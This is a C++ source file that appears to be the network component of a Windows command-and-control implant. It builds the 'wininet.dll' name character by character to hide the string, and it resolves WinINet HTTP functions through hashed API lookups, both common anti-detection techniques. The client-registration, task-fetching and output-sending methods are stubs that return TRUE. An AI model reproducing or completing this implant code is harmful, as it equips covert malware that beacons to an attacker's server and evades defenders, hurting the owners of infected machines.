#include "network.hpp"
#include "apidefs.hpp"



Network::Network() {
	this->HttpApis = AllocMemory<HTTPAPIS>(sizeof(struct HTTPAPIS));
	char buf[12];
	buf[0]  = 'w';
	buf[1]  = 'i';
	buf[2]  = 'n';
	buf[3]  = 'i';
	buf[4]  = 'n';
	buf[5]  = 'e';
	buf[6]  = 't';
	buf[7]  = '.';
	buf[8]  = 'd';
	buf[9]  = 'l';
	buf[10] = 'l';
	buf[11] = '\0';

	kModules->WININET = WinApis->LoadLibraryA(buf);
	if (kModules->WININET) {
		this->HttpApis->InternetOpenA = (decltype(this->HttpApis->InternetOpenA))GetProc(kModules->WININET, HASHED_InternerOpenA);
		this->HttpApis->HttpAddRequestHeadersA = (decltype(this->HttpApis->HttpAddRequestHeadersA))GetProc(kModules->WININET, HASHED_AddHeaders);
		this->HttpApis->HttpOpenRequestA = (decltype(this->HttpApis->HttpOpenRequestA))GetProc(kModules->WININET, HASHED_OpenRequest);
		this->HttpApis->HttpSendRequestA = (decltype(this->HttpApis->HttpSendRequestA))GetProc(kModules->WININET, HASHED_SendRequest);
		this->HttpApis->InternetCloseHandle = (decltype(this->HttpApis->InternetCloseHandle))GetProc(kModules->WININET, HASHED_InternetCloseHandle);
		this->HttpApis->InternetConnectA = (decltype(this->HttpApis->InternetConnectA))GetProc(kModules->WININET, HASHED_InternetConnect);
		this->HttpApis->InternetReadFile = (decltype(this->HttpApis->InternetReadFile))GetProc(kModules->WININET, HASHED_InternetReadFile);
		this->HttpApis->InternetSetOptionA = (decltype(this->HttpApis->InternetSetOptionA))GetProc(kModules->WININET, HASHED_InternetSetOptionA);
	}

}



BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {
	return TRUE;
}


BOOL Network::GetTask(PBYTE OutData, SIZE_T BufSize) {
	return TRUE;
}


BOOL Network::SendOutput(PBYTE InData, SIZE_T InLen) {
	return TRUE;
}

Network* g_Network = NULL;